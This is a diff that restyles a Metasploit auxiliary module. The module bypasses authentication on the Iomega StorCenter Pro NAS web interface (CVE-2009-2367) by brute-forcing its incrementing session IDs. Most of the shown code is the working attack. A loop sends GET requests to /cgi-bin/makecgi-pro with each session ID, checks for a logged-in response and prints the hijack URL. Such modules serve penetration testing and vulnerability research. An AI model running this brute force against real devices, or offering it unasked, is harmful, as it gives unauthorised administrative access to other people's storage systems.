@@ -1,27 +1,26 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
       'Name'        => 'Iomega StorCenter Pro NAS Web Authentication Bypass',
-      'Description' => %q{
+      'Description' => %q(
         The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs,
         allowing for simple brute force attacks to bypass authentication and gain administrative
         access.
-        },
+        ),
       'References'  =>
         [
           [ 'OSVDB', '55586' ],
-          [ 'CVE', '2009-2367' ],
+          [ 'CVE', '2009-2367' ]
         ],
       'Author'      => [ 'patrick' ],
       'License'     => MSF_LICENSE
@@ -30,22 +29,23 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
     datastore['SID_MAX'].times do |x|
       begin
-        print_status("Trying session ID #{x.to_s}")
+        print_status("Trying session ID #{x}")
 
         res = send_request_raw({
-          'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
-          'method'  => 'GET'
-        }, 25)
+                                 'uri' => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
+                                 'method' => 'GET'
+                               }, 25)
 
-        if (res and res.to_s =~ /Log out/)
-          print_status("Found valid session ID number #{x.to_s}!")
-          print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x.to_s}")
+        if res && res.to_s =~ /Log out/
+          print_status("Found valid session ID number #{x}!")
+          print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
           break
         end
 
